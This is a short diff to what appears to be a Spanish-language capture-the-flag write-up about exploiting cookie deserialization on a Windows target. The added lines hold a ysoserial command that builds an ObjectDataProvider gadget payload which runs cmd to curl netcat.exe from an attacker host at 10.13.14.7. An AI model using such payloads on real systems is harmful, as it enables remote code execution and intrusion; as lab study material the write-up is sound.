@@ -147,7 +147,11 @@ descubrimos un correo enviado y tenemos un archivo.zip que vamos a descargar
 viendo esto puedo pensar el realizar una Deseralización de las cookies del perfil. para ello necesitaremos una herramienta que se llama ysoserial que esta para Windows así que vamos a necesitar una maquina Windows para este paso
 ![[Pasted image 20240714145130.png]]
 
+### Windows machine
 
+```python
+.\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.13.14.7/netcat.exe -o C:\ProgramData\netcat.exe"
+```
 
 
 
